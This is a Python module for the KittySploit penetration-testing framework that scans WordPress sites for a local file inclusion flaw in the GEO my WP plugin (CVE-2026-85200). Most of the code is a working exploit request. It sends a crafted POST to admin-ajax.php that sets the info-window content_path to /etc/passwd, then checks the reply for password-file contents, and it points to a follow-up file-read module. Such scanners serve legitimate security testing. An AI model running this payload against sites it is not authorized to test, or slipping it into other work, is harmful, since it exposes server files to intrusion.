#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GEO my WP <= 4.5.5.3 info window LFI (CVE-2026-85200)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "geo-my-wp"
_VULN_HIGH = (4, 5, 5, 3)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "GEO my WP CVE-2026-85200 LFI detect",
        "description": "Probes gmw_info_window_init content_path for /etc/passwd disclosure.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-85200",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-85200"],
        "modules": ["auxiliary/admin/http/geo_my_wp_cve_2026_85200_file_read"],
        "tags": ["web", "scanner", "wordpress", "geo-my-wp", "lfi", "cve-2026-85200"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/geo_my_wp_cve_2026_85200_file_read"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    lfi_probe = OptBool(True, "POST /etc/passwd probe", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        if not self.lfi_probe:
            readme = self.http_request(
                method="GET",
                path=self._join("/wp-content/plugins/geo-my-wp/readme.txt"),
                allow_redirects=False,
            )
            if readme and "GEO my WP" in (readme.text or ""):
                self.set_info(severity="high", reason="GEO my WP plugin present", cve="CVE-2026-85200")
                return True
            return False
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            data={
                "action": "gmw_info_window_init",
                "location[object_id]": "1",
                "location[location_id]": "1",
                "form[component]": "posts_locator",
                "form[prefix]": "pt",
                "form[info_window_template][content_path]": "/etc/passwd",
            },
            allow_redirects=False,
        )
        body = resp.text or "" if resp else ""
        if resp and "root:x:0:0" in body:
            self.set_info(
                severity="high",
                reason="gmw_info_window_init includes arbitrary local file",
                cve="CVE-2026-85200",
            )
            return True
        return False
